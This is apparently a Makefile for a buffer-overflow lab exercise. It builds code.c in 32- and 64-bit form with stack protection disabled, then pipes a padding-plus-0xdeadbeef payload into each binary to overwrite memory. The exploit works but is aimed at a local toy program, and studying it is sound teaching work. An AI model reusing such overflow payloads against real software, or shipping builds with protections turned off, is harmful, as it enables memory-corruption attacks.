all: build32 build64

build32: code.c
	gcc $< -o run32 -m32 -fno-stack-protector

build64: code.c
	gcc $< -o run64 -fno-stack-protector

run32: build32
	python2 -c "print 'A'*40+'\xef\xbe\xad\xde'" | ./$@

run64: build64
	python3 -c "import sys; sys.stdout.buffer.write(b'A'*44+b'\xef\xbe\xad\xde')" | ./$@

clean:
	rm -f run32 run64

.PHONY: clean

